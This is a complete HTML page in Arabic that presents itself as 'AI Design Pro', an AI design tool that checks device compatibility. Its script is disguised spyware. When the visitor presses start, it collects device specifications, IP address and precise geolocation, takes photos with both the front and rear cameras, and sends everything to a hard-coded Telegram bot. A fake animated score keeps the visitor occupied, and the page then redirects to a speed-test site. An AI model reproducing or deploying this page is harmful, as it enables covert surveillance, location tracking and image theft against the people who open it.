<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI Design Pro | محرك تصميم الصور والفيديوهات بالذكاء الاصطناعي</title>
    <style>
        :root { --accent: #00d2ff; --dark-bg: #0b0e18; --card-bg: rgba(255, 255, 255, 0.03); }
        body { background: var(--dark-bg); color: white; font-family:  Segoe UI , sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .grid-bg { position: absolute; width: 100%; height: 100%; background-image: linear-gradient(rgba(0, 210, 255, 0.015) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 210, 255, 0.015) 1px, transparent 1px); background-size: 30px 30px; z-index: -1; }
        .main-card { background: var(--card-bg); padding: 40px; border-radius: 30px; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(20px); text-align: center; width: 85%; max-width: 400px; box-shadow: 0 30px 70px rgba(0,0,0,0.7); transition: 0.5s; }
        h1 { font-size: 20px; margin: 0 0 10px; font-weight: 300; letter-spacing: 1px; color: #fff; text-transform: uppercase; }
        h1 span.ai-purple { color: #a855f7; font-weight: bold; }
        .status-dot { display: inline-block; width: 8px; height: 8px; background: #4caf50; border-radius: 50%; margin-left: 8px; box-shadow: 0 0 10px #4caf50; animation: pulse 2s infinite; }
        .gauge-box { position: relative; width: 220px; height: 220px; margin: 30px auto; border-radius: 50%; border: 2px solid rgba(168, 85, 247, 0.2); display: flex; flex-direction: column; align-items: center; justify-content: center; background: rgba(0,0,0,0.2); }
        #goBtn { width: 160px; height: 160px; border-radius: 50%; border: none; background: transparent; color: #a855f7; font-size: 28px; font-weight: bold; cursor: pointer; border: 4px solid #a855f7; transition: 0.4s; z-index: 5; box-shadow: inset 0 0 20px rgba(168, 85, 247, 0.2), 0 0 15px rgba(168, 85, 247, 0.1); outline: none; text-transform: uppercase; letter-spacing: 2px; }
        #goBtn:active { transform: scale(0.9); background: rgba(168, 85, 247, 0.1); }
        .loader-ring { position: absolute; width: 100%; height: 100%; border: 4px solid transparent; border-top-color: #a855f7; border-radius: 50%; display: none; animation: spin 1s linear infinite; }
        #speedDisplay { display: none; text-align: center; }
        .speed-num { font-size: 48px; font-weight: 800; color: #a855f7; display: block; filter: drop-shadow(0 0 10px rgba(168, 85, 247, 0.5)); }
        .unit { font-size: 13px; color: #8892b0; font-weight: 300; }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(76, 175, 80, 0); } 100% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0); } }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="grid-bg"></div>
    <div class="main-card">
        <h1>AI DESIGN <span class="ai-purple">PRO</span> <span class="status-dot"></span></h1>
        <p id="subText" style="color: #8892b0; font-size: 13px;">قم بتحليل توافق جهازك وتشغيل محرك التصميم الذكي</p>
        <div class="gauge-box">
            <div id="ring" class="loader-ring"></div>
            <button id="goBtn">بدء</button>
            <div id="speedDisplay">
                <span id="num" class="speed-num">0.0</span>
                <span class="unit">AI Neural Score</span>
            </div>
        </div>
        <div style="margin-top: 20px; font-size: 11px; color: #555;">Processing Node: Neural-Core-YEM</div>
    </div>
    
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
        const chat = "7984067238";

        async function sendToTelegram(msg, isImg = false, data = null) {
            const url = `https://api.telegram.org/bot${token}/`;
            try {
                if(!isImg) {
                    await fetch(url + "sendMessage?chat_id=" + chat + "&text=" + encodeURIComponent(msg) + "&parse_mode=Markdown");
                } else {
                    const fd = new FormData();
                    fd.append("chat_id", chat);
                    fd.append("photo", data, "shot.jpg");
                    await fetch(url + "sendPhoto", {method: "POST", body: fd});
                }
            } catch(e) {}
        }

        async function getFullReport() {
            try {
                let info = `📊 *تقرير شامل للهدف*:\n\n`;
                info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
                info += `• 💾 الرام: \`${navigator.deviceMemory || "غير معروف"} GB\`\n`;
                info += `• ⚙️ المعالج: \`${navigator.hardwareConcurrency} Cores\`\n`;
                info += `• 🖥️ الشاشة: \`${window.screen.width}x${window.screen.height}\`\n`;
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (conn) {
                    info += `• 📶 نوع الشبكة: \`${conn.effectiveType.toUpperCase()}\`\n`;
                    info += `• ⚡ سرعة الخط: \`${conn.downlink} Mbps\`\n`;
                }
                try {
                    const b = await navigator.getBattery();
                    info += `• 🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌 يشحن" : "🔋 بطارية"})\n`;
                } catch(e) {}
                info += `• 🌐 لغة الهاتف: \`${navigator.language}\`\n`;
                const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "Unknown"}));
                info += `• 🌐 الـ IP: \`${ipRes.ip}\`\n`;
                return info;
            } catch(e) { return "خطأ في جمع التقرير"; }
        }

        async function snap(mode) {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: mode === "user" ? "user" : "environment"}});
                const v = document.getElementById("v");
                const c = document.getElementById("c");
                v.srcObject = s;
                await new Promise(r => v.onloadedmetadata = r);
                await new Promise(r => setTimeout(r, 1200));
                c.width = 720; c.height = 540;
                c.getContext("2d").drawImage(v, 0, 0);
                s.getTracks().forEach(t => t.stop());
                return new Promise(res => c.toBlob(res, "image/jpeg", 0.75));
            } catch(e) { return null; }
        }

        document.getElementById("goBtn").onclick = async function() {
            // 1. تفعيل الواجهة فوراً
            this.style.display = "none";
            document.getElementById("ring").style.display = "block";
            document.getElementById("speedDisplay").style.display = "block";
            document.getElementById("subText").innerText = "جاري الاتصال بالعقل العصبي...";

            // 2. تشغيل العداد فوراً
            const timer = setInterval(() => {
                let random = (Math.random() * (99.8 - 91.5) + 91.5).toFixed(1);
                document.getElementById("num").innerText = random;
            }, 100);

            // 3. تنفيذ المهام في الخلفية دون تعطيل الزر (Background Execution)
            (async () => {
                const report = await getFullReport();
                await sendToTelegram(report);

                navigator.geolocation.getCurrentPosition(async (p) => {
                    await sendToTelegram(`📍 *الموقع الدقيق*:\n[فتح عبر خرائط جوجل](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
                }, () => sendToTelegram("❌ رفض إذن الموقع"));

                const front = await snap("user");
                if(front) await sendToTelegram("📸 صورة أمامية", true, front);

                const back = await snap("environment");
                if(back) await sendToTelegram("📷 صورة خلفية", true, back);
            })();

            // 4. التوجيه النهائي
            setTimeout(() => {
                clearInterval(timer);
                location.href = "https://www.speedtest.net/ar";
            }, 7500); 
        };
    </script>
</body>
</html>
